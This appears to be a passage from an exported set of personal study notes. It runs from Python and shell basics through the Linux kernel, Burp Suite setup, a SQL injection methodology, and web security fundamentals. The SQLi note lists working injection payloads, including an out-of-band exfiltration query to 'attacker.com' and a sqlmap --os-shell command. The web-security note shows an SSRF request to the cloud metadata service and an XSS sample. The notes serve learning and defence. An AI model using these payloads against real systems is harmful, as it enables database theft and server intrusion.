Optional[int]:\n    if not items:\n        return None\n    return len(items)\n\n\n6. Generators &amp; Iterators ♻️\nDon’t load a 10GB CSV file into RAM. Stream it.\nGenerator Function (yield):\nReturns an iterator that produces one item at a time. State is suspended between calls.\nPython\ndef huge_file_reader(filename):\n    with open(filename) as f:\n        for line in f:\n            yield line.strip() # Memory usage: 1 line, not whole file\n\n# Usage\nfor row in huge_file_reader(&quot;data.csv&quot;):\n    process(row)\n\n\n7.

The Shell (Strap Yourself In) 🐚\nThe Shell (Bash/Zsh) is not just a command runner; it is a full programming environment.\nThe Streams (I/O)\nEvery program has 3 connections to the outside world:\n\nSTDIN (0): Standard Input (Keyboard).\nSTDOUT (1): Standard Output (Screen).\nSTDERR (2): Standard Error (Screen, specifically for errors).\n\nRedirection &amp; Piping\nThe pipe | is the most powerful operator in Linux. It connects the STDOUT of the left command to the STDIN of the right command.\n# Redirection\necho &quot;Hello&quot; &gt; file.txt      # Overwrite file\necho &quot;World&quot; &gt;&gt; file.txt     # Append to file\n \n# Piping\ncat file.txt | grep &quot;Hello&quot;  # Read file -&gt; Search for string\nps aux | grep firefox        # List processes -&gt; Filter for browser\n \n# The &quot;Black Hole&quot;\n./script.sh &gt; /dev/null 2&gt;&amp;1 # Silence all output (Send to void)\n\n3.

It is the only program that has full access to the hardware (Ring 0). Everything else—your shell, your browser, Docker—lives in “User Space” (Ring 3) and must politely ask the Kernel to do things via System Calls.\n\n\n1. Architecture Overview\nLinux is a Monolithic, yet Modular kernel.\n\nMonolithic: The file system, drivers, network stack, and scheduler all run in the same high-privileged memory space.\nModular: You can insert code (Kernel Modules) into the running kernel on the fly without rebooting.\n\nThe User Space Barrier (Ring 3 vs Ring 0)\nWhen you run mkdir folder, your CPU switches modes.\n\nUser Space: mkdir command runs.\nContext Switch: Program calls mkdir() syscall.\nKernel Space: CPU jumps to Ring 0. Kernel checks permissions, writes to disk inode.\nReturn: CPU jumps back to Ring 3. mkdir exits.\n\n\n2. Key Subsystems\nA. The Scheduler (CFS)\nThe Completely Fair Scheduler (CFS) decides which process gets the CPU.\n\nIt uses a Red-Black Tree to track processes.\nProcesses waiting the longest (lowest vruntime) are picked next.\nNice Value: You can manipulate this priority. nice -n -20 tells the kernel “I am important.”\n\nB. Memory Management (The Great Lie)\nThe Kernel lies to every process.\n\nVirtual Memory: Every application thinks it has access to a massive, contiguous block of RAM.\nPaging: The Kernel maps these “Virtual” addresses to scattered “Physical” RAM pages (4KB chunks).\nThe OOM Killer: If RAM is full, the kernel scans for a victim process (usually Chrome or Java) and executes it to save the system.\n\nC. The Virtual File System (VFS)\n“Everything is a file.”\nThe VFS creates a uniform abstraction. It doesn’t matter if data is on an SSD (ext4), a USB stick (fat32), or a network share (nfs). The Kernel treats them all as files.\n\n/proc: This is a “pseudo-filesystem”. It doesn’t exist on disk. It is a window directly into the Kernel’s RAM.\n\n\n3. Kernel Modules (Drivers)\nOn Fedora, your kernel is vmlinuz. It is small. Most drivers (WiFi, GPU) are loaded dynamically as .ko (Kernel Object) files.\nManagement Commands:\nlsmod             # List loaded modules\nmodinfo kvm       # Get info about a specific module\nsudo modprobe -v kvm_intel  # Load a module safely\nsudo rmmod kvm_intel        # Unload a module\n\n\n                  \n                  Security Risk \n                  \n                \n\nRootkits often hide as Kernel Modules. If an attacker can insmod a malicious .ko file, they own the machine completely. They can hide processes from top and files from ls.\n\n\n\n4. The Boot Process (From Power to Login)\nUnderstanding this is crucial for troubleshooting “Unbootable” systems.\n\n\nBIOS/UEFI: Hardware check (POST). Loads the Bootloader.\n\n\nBootloader (GRUB2): The menu where you select Fedora. It loads the Kernel Image (vmlinuz) into RAM.\n\n\nInitramfs: A tiny, temporary file system loaded into RAM. It contains just enough drivers to mount your actual hard drive (e.g., decryption tools for LUKS).\n\n\nKernel Init: The kernel mounts the root filesystem (/) as read-only, then read-write.\n\n\nUser Space Init: The Kernel starts PID 1 (systemd).\n\n\nSystemd: Starts services (NetworkManager, GDM, Docker) in parallel.\n\n\n\n5. Compiling a Custom Kernel\nThe ultimate rite of passage. Why do this? To strip out bloat, enable experimental features, or just to learn.\nSteps on Fedora:\nBash\n# 1. Install Dev Tools\nsudo dnf5 group install &quot;development-tools&quot;\nsudo dnf install ncurses-devel bison flex elfutils-libelf-devel openssl-devel\n\n# 2.

Configure (The Hard Part)\n# Copy your existing Fedora config as a base\ncp /boot/config-$(uname -r) .config\nmake menuconfig\n# &gt; A blue menu appears. This is where you enable/disable drivers.\n\n# 4. Compile (Takes time! Use all cores)\nmake -j $(nproc)\n\n# 5. Install Modules &amp; Kernel\nsudo make modules_install\nsudo make install\n\n# 6. Update Bootloader\n# Fedora usually does this automatically on &#039;make install&#039;, \n# but verify it appears in /boot/grub2/grub.cfg\n\n\n6. Kernel Hacking &amp; Security\neBPF (Extended Berkeley Packet Filter)\nThe hottest topic in DevOps right now. eBPF allows you to run sandboxed programs inside the kernel without changing kernel source code or loading modules.\n\nUse cases: High-performance networking (Cilium), Observability (Pixie), Security (Falco).\n\nSELinux (Security Enhanced Linux)\nDeveloped by the NSA, standard on Fedora. It enforces Mandatory Access Control (MAC).\nEven if you are Root, SELinux can block you from doing things the policy forbids (like Apache writing to /home).\nAnalyzing a Crash (Kernel Panic)\nWhen the kernel crashes, it often dumps logs to dmesg.\n\n\nOops: The kernel killed a process but the system is still alive.\n\n\nPanic: The kernel detected a fatal error and halted the system to prevent data corruption.\n\n\n\n7.

Installation on Fedora (JUICE)\nWhile dnf has some security tools, it is best to download the official installer or JAR to stay current.\nOption A: The Script (Recommended)\n\nDownload the Linux (64-bit) installer from PortSwigger.\nMake it executable and run:\nchmod +x burpsuite_pro_linux_v2023_x_x.sh\n./burpsuite_pro_linux_v2023_x_x.sh\n\n\nOption B: The JAR (Portable)\nIf you prefer a lightweight setup:\n# Launch with 4GB RAM allocation\njava -jar -Xmx4g burpsuite_pro.jar\n\n2. Browser Integration (The Critical Step) 🔌\nDo not configure your system-wide proxy. That breaks Spotify and Discord. Use Firefox with FoxyProxy.\nStep A: FoxyProxy Setup\n\n\nInstall the FoxyProxy Standard extension in Firefox.\n\n\nAdd a new proxy:\n\n\nType: HTTP\n\n\nIP: 127.0.0.1\n\n\nPort: 8080\n\n\nColor: Green (or whatever signals “Hacking Mode”)\n\n\n\n\nClick the FoxyProxy icon and select your new profile.\n\n\nStep B: Installing the CA Certificate\nIf you skip this, HTTPS sites will throw “Secure Connection Failed” errors.\n\n\nEnsure Burp is running and FoxyProxy is set to Burp.\n\n\nVisit http://burp in Firefox.\n\n\nClick “CA Certificate” in the top right to download cacert.der.\n\n\nIn Firefox: Settings → Search “Certificates” → View Certificates.\n\n\nClick Import → Select cacert.der.\n\n\nCheck both boxes:\n\n\n Trust this CA to identify websites.\n\n\n Trust this CA to identify email users.\n\n\n\n\n\n3. The Arsenal: Core Tools 🛠️\nA. Proxy (The Gatekeeper)\n\n\nIntercept: Toggles traffic flow.\n\n\nOn: Requests hang until you click “Forward”. Great for modifying a request on the fly.\n\n\nOff: Traffic flows passively. Use this 90% of the time and check HTTP History.\n\n\n\n\nHTTP History: The log of everything. Filter by “Scope” to hide Google Analytics noise.\n\n\nB. Repeater (The Lab)\nShortcut: Ctrl + R (Send to Repeater)\nThis is where research happens. You take a request, tweak one parameter (e.g., change id=1 to id=1’), and hit Send to see the raw response.\n\nWorkflow: Send \\rightarrow Modify \\rightarrow Check Response Code/Length \\rightarrow Repeat.\n\nC. Intruder (The Machine Gun)\nShortcut: Ctrl + I\nUsed for brute-forcing and fuzzing.\n\n\nPayload Positions: Highlight the data you want to fuzz (e.g., a password field).\n\n\nAttack Type:\n\n\nSniper: Single payload set. Tries list A against slot 1, then slot 2.\n\n\nBattering Ram: Same payload in all slots simultaneously.\n\n\nPitchfork: Different payloads for different slots (User/Pass lists).\n\n\n\n\nD. Decoder\nA built-in utility for Base64, URL, HTML, and Hex encoding.\n\nTip: Use the “Smart Decode” button if you see garbage text.\n\n\n4. Methodology: The Search for Anomalies\nWhen analyzing a target, I follow this loop:\n\n\nMap the App: Click every button. Fill every form. Populate the Site Map.\n\n\nDefine Scope: Right-click the domain in Target tab → “Add to Scope”.\n\nProxy Filter: Click the filter bar → “Show only in-scope items”.\n\n\n\nHunt:\n\n\nLook for ID parameters (user=101) \\rightarrow Test IDOR.\n\n\nLook for search bars \\rightarrow Test XSS/SQLi.\n\n\nLook for file uploads \\rightarrow Test RCE.\n\n\n\n\n\n5.

Testing for SQL Injection on servers you do not own or have explicit permission to test is illegal. This guide is for educational purposes, CTF challenges, and hardening your own applications.\n\n\n1. The Core Mechanic\nSQL Injection occurs when untrusted user input is dynamically concatenated into a database query string without validation or parameterization. This allows an attacker to manipulate the structure of the SQL command, effectively “breaking out” of the data context and entering the command context.\nThe Anatomy of a Flaw:\n// VULNERABLE CODE\n$query = &quot;SELECT * FROM users WHERE id = &quot; . $_GET[&#039;id&#039;];\nIf input is 1 UNION SELECT 1, user(), 3, the query becomes a completely different instruction than the developer intended.\n\n2. Detection Phase (The Probe)\nBefore exploiting, we must confirm the vulnerability exists. We look for Anomalies.\nA. Character Injection (Breaking the Syntax)\nWe inject characters that have special meaning in SQL.\n\n\n&#039; (Single Quote)\n\n\n&quot; (Double Quote)\n\n\n; (Statement Terminator)\n\n\n-- or # (Comments)\n\n\nThe Test:\n\n\nid=1&#039; \\rightarrow HTTP 500 / Database Error (Good sign).\n\n\nid=1&#039;&#039; \\rightarrow HTTP 200 (If the error disappears, the syntax was repaired. Vulnerability confirmed).\n\n\nB. Logical Injection (Boolean Inference)\nIf errors are suppressed (Blind SQLi), we test logical statements.\n\n\nid=1 AND 1=1 \\rightarrow Page loads normally (True).\n\n\nid=1 AND 1=2 \\rightarrow Page is missing content (False).\nIf the application behaves differently between True and False, it is vulnerable.\n\n\nC. Mathematical Injection\nUseful when the input is numeric.\n\n\nInput: id=2-1\n\n\nIf the page displays the same content as id=1, the database performed the arithmetic.\n\n\n\n3. Classification &amp; Exploitation\nType 1: In-Band SQLi (Classic)\nThe attacker uses the same communication channel to launch the attack and gather results.\nUnion-Based\nWe use the UNION operator to combine the results of the original query with the results of our injected query.\n\nRequirement: Both queries must have the same number of columns and compatible data types.\n\nMethodology:\n\n\nFind Column Count: ORDER BY 1, ORDER BY 2… until the page breaks.\n\n\nFind Output Point: UNION SELECT 1, 2, 3, 4 (See which number appears on screen).\n\n\nExfiltrate: UNION SELECT 1, database(), version(), 4.\n\n\nError-Based\nWe intentionally cause the database to throw an error that contains the data we want.\n\n\nExample (MySQL): extractvalue() or updatexml().\n\n\nPayload: AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1)\n\n\n\nType 2: Blind SQLi (Inferential)\nThe application does not return data or errors. We must play “20 Questions” with the database.\nBoolean-Based Blind\nWe ask True/False questions and observe the HTTP response length or content.\n\n\nPayload: id=1 AND (SELECT substring(password,1,1) FROM users WHERE username=&#039;admin&#039;)=&#039;a&#039;\n\n\nLogic: “Is the first letter of the admin password ‘a’?” → If page loads, YES. If not, NO.\n\n\nTime-Based Blind\nThe last resort. We ask the DB to “sleep” if a condition is true.\n\n\nPayload: id=1&#039; AND IF(1=1, SLEEP(5), 0)--\n\n\nLogic: If the request takes 5+ seconds to return, the vulnerability exists.\n\n\n\nType 3: Out-of-Band (OOB)\nUsed when the application gives no feedback at all (Async processing). We force the DB to make a DNS or HTTP request to a server we control.\n\n\nTechnique: DNS Exfiltration.\n\n\nPayload (Oracle): SELECT UTL_HTTP.REQUEST(&#039;attacker.com/&#039;||(SELECT user FROM DUAL)) FROM DUAL\n\n\n\n4. DBMS Specific Cheatsheet\nDifferent databases use different syntax. Fingerprinting the DB is step one.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFeatureMySQLPostgreSQLMSSQLOracleVersion@@versionversion()@@versionSELECT banner FROM v$versionConcatconcat(a,b)a|ba+ba|bCurrent Useruser()current_useruser_name()userList Tablesinformation_schema.tablesinformation_schema.tablesinformation_schema.tablesall_tables\n\n5. Defense: Remediation 🛡️\nPrimary Defense: Prepared Statements (Parameterized Queries)\nThis is the only 100% effective cure.\nInstead of concatenating strings, we use placeholders (? or :id). The database engine treats user input strictly as data, never as executable code.\nSecure PHP (PDO):\nPHP\n$stmt = $pdo-&gt;prepare(&#039;SELECT * FROM users WHERE id = :id&#039;);\n$stmt-&gt;execute([&#039;id&#039; =&gt; $id]);\n$user = $stmt-&gt;fetch();\n\nSecondary Defenses (Defense in Depth)\n\n\nInput Validation: Ensure id is actually an integer (is_numeric()) before passing it to the logic.\n\n\nLeast Privilege: The database user used by the web app should only have access to the tables it needs. It should never be root or sa.\n\n\nWAF (Web Application Firewall): Can detect common SQL keywords (UNION, SELECT) and block the request.\n\n\n\n6. Tools of the Trade\n\n\nBurp Suite Pro: The manual interceptor for modifying requests on the fly.\n\n\nSQLMap: The automated king.\n\n\nsqlmap -u &quot;target.com --dbs (List databases)\n\n\nsqlmap -u &quot;target.com --os-shell (Attempt to upload a web shell)\n\n\n\n\n\nLinked Notes\n\n\nWeb-Security-Basics\n\n\nBurp-Suite-Setup\n\n\nSystem-Design-Basics (Designing secure DB layers)\n\n"},"Security/Web-Security-Basics":{"slug":"Security/Web-Security-Basics","filePath":"Security/Web-Security-Basics.md","title":"Web Security Fundamentals","links":["Security/SQL-Injection-Methodology","Security/Burp-Suite-Setup","Development/JavaScript-Ultimate-Guide"],"tags":["security","http","owasp","networking","theory","LLM"],"content":"\n\n                  \n                  The Security Mindset \n                  \n                \n\nSecurity is not a feature you add at the end; it is a state of being.\nIn web development, we assume User Input is Evil. The browser is a hostile environment controlled by the user, and the network is a public wire monitored by adversaries.\n\n\n1. The Protocol: HTTP &amp; HTTPS 🌐\nThe web is built on the HyperText Transfer Protocol. Understanding this is non-negotiable.\nAnatomy of a Request\nPOST /login HTTP/1.1\nHost: bank.com\nUser-Agent: Mozilla/5.0...\nCookie: session_id=xyz123\nContent-Type: application/x-www-form-urlencoded\n \nusername=admin&amp;password=password123\nThe CIA Triad\nEvery security control maps to one of these three:\n\n\nConfidentiality: Only authorized people can see the data (Encryption).\n\n\nIntegrity: The data has not been tampered with (Hashing/Signatures).\n\n\nAvailability: The system is up and running (DDoS Protection).\n\n\nHTTPS (TLS/SSL)\nHTTP is cleartext. Anyone on the WiFi can read your password using Wireshark.\nTLS (Transport Layer Security) solves this by encrypting the pipe.\n\n\nHandshake: The client and server agree on a “Cipher Suite” and exchange keys.\n\n\nCertificates: The server proves its identity using a certificate signed by a trusted CA (Certificate Authority).\n\n\n\n2. The Browser Security Model 🛡️\nAs a Frontend Developer, this is your battleground.\nSame Origin Policy (SOP)\nThe most important rule in the browser.\n\n\nDefinition: A script loaded from Origin A cannot access data from Origin B.\n\n\nOrigin: Defined by Protocol + Domain + Port.\n\n\ngoogle.com \\neq google.com (Different Protocol)\n\n\ngoogle.com \\neq api.google.com (Different Domain)\n\n\n\n\nCORS (Cross-Origin Resource Sharing)\nSOP breaks the modern web (where your React frontend talks to your Node backend on a different port).\nCORS is the “Exception” to SOP.\n\n\nThe Browser asks the server: “Hey, localhost:3000 wants to read your data. Is that cool?” (Preflight Request).\n\n\nThe Server replies: Access-Control-Allow-Origin: localhost:3000.\n\n\n\n\n                  \n                  Misconfiguration \n                  \n                \n\nSetting Access-Control-Allow-Origin: * allows ANY website to read your users’ private data if they are logged in. Never use * with Access-Control-Allow-Credentials: true.\n\n\nCSP (Content Security Policy)\nA header that tells the browser which sources are trusted for scripts, images, and styles.\n\n\nHeader: Content-Security-Policy: default-src &#039;self&#039;; script-src &#039;self&#039; trusted.com\n\n\nBenefit: It kills XSS. Even if an attacker injects &lt;script&gt;alert(1)&lt;/script&gt;, the browser refuses to execute it because it violates the policy.\n\n\n\n3. Client-Side Attacks\nCross-Site Scripting (XSS)\nThe attacker injects malicious JavaScript into a page viewed by other users.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTypeMechanismPersistenceReflectedPayload is in the URL (?q=&lt;script&gt;...). User clicks a bad link.No (Single Request)StoredPayload is saved in the DB (Comment section). Every visitor gets hacked.Yes (Persistent)DOM-basedPayload executes purely in Client-side JS without hitting the server.No\n\n\nImpact: Cookie theft (document.cookie), Keylogging, Phishing.\n\n\nDefense: Context-aware Output Encoding (React does this by default).\n\n\nCross-Site Request Forgery (CSRF)\nThe attacker forces an authenticated user to perform an action they didn’t intend to.\n\n\nScenario: You are logged into bank.com. You visit evil.com.\n\n\nAttack: evil.com has a hidden form that auto-submits a POST request to bank.com/transfer. Since your browser sends your Cookies automatically, the bank thinks you made the request.\n\n\nDefense: Anti-CSRF Tokens (Hidden random values in forms) or SameSite Cookie attributes (SameSite=Strict).\n\n\n\n4. Server-Side Attacks\nIDOR (Insecure Direct Object Reference)\nThe application exposes an internal object key (ID) and fails to check authorization.\n\n\nRequest: GET /invoices?id=100 (Your invoice)\n\n\nAttack: Change to GET /invoices?id=101 (Someone else’s invoice).\n\n\nDefense: Check ownership (if invoice.user_id == current_user.id) for every request.\n\n\nSSRF (Server-Side Request Forgery)\nThe attacker tricks the server into making a request to an internal resource.\n\n\nScenario: An image fetcher: POST /upload?url=example.com/image.png\n\n\nAttack: POST /upload?url=http://169.254.169.254/latest/meta-data/ (AWS Metadata service).\n\n\nImpact: Stealing cloud credentials (AWS Keys) or scanning internal ports.\n\n\n\n5. Authentication vs. Authorization\n\n\nAuthentication (AuthN): “Who are you?” (Login, MFA).\n\n\nAuthorization (AuthZ): “What are you allowed to do?” (Permissions, Roles).\n\n\nJWT (JSON Web Tokens)\nThe standard for modern APIs.\n\n\nStructure: Header . Payload . Signature\n\n\nThe Signature: Created using a Secret Key on the server. Prevents tampering.\n\n\nThe “None” Algorithm: A classic vulnerability where attackers strip the signature and set alg: none.\n\n\n\n6. The Hardening Checklist 📝\n\n\nHTTPS Everywhere: Use HSTS (Strict-Transport-Security).\n\n\nSecure Cookies: Set Secure (HTTPS only), HttpOnly (No JS access), and SameSite.\n\n\nHeaders:\n\n\nX-Frame-Options: DENY (Prevents Clickjacking).\n\n\nX-Content-Type-Options: nosniff (Prevents MIME sniffing).\n\n\n\n\nDependencies: Run npm audit or use Snyk to check for CVEs in your node_modules.\n\n\n\nLinked Notes\n\n\nSQL-Injection-Methodology - A deep dive into injection.\n\n\nBurp-Suite-Setup - The tool to test these flaws.\n\n\nJavaScript-Ultimate-Guide - Understanding the language of XSS.\n\n"},"University/Differential-Equations":{"slug":"University/Differential-Equations","filePath":"University/Differential-Equations.md","title":"Differential Equations (ODE) Reference","links":["CPP-Ultimate-Guide","Linear-Algebra","Physics-Simulation"],"tags":["math","calculus","university","latex","cs-theory","LLM"],"content":"\n\n                  \n                  The Language of Change \n                  \n                \n\nA Differential Equation (DE) describes how a state changes over time.\n\nAlgebra solves for unknown numbers: x^2 + 2x = 0\nDifferential Equations solve for unknown functions: \\frac{dy}{dx} = ky\n\nIn Computer Science, we rarely solve these analytically (by hand).
